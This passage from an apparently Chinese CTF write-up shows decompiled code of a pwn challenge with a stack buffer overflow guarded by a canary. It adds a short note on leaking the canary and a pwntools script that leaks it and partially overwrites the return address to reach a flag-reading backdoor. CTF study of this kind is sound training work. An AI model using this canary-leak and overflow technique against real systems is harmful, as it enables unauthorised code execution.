  read(0, buf, 8u);
  if ( buf[0] == password )
  {
    puts("You find the secret:");
    fd = open("/flag", 0);
    if ( fd == -1 )
    {
      puts("Failed to open flag file.");
      exit(1);
    }
    read(fd, &flag, 0x64u);
    write(1, &flag, 0x64u);
    close(fd);
  }
  exit(0);
}

unsigned __int64 vuln()
{
  char buf[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts(aThisTimeIWon);
  puts("Here is a beautiful canary, and it will be watching over you.");
  read(0, buf, 0x2Au);
  puts("Go ahead and overflow, anyway I have a canary.");
  puts(buf);
  puts("I will give you a second chance, since you can not do anything anyway.");
  puts(aEvenIfYouKillT);
  read(0, buf, 0x2Au);
  return v2 - __readfsqword(0x28u);
}

int setup()
{
  int result; // eax
  int fd; // [rsp+Ch] [rbp-4h]

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  result = open("/dev/urandom", 0);
  fd = result;
  if ( result != -1 )
  {
    read(result, &password, 8u);
    return close(fd);
  }
  return result;
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  setup(argc, argv, envp);
  vuln();
  return 0;
}
```

填满buf覆盖 `\x00` 泄露 `canary`，循环攻击爆破 `canary` ，空间不够就使用 `p16()`

### EXP

```python
from pwn import*
context.log_level = 'debug'

bkd = 0x127D

while True:
    # p = process('./pwn')
    p = remote('192.168.50.1',59263)
    try:
        p.sendafter(b'over you.\n',b'A'*25)
        p.recvuntil(b'A'*25)
        canary = u64(p.recv(7).rjust(8, b'\x00'))
        log.success(f"Leaked canary: {hex(canary)}")

        payload = b"a"*24 + p64(canary) + b'SNOWCATT' + p16(bkd)
        p.sendline(payload)
    except:
        print("error",end=' ')
    else:
        p.interactive()
        continue
```



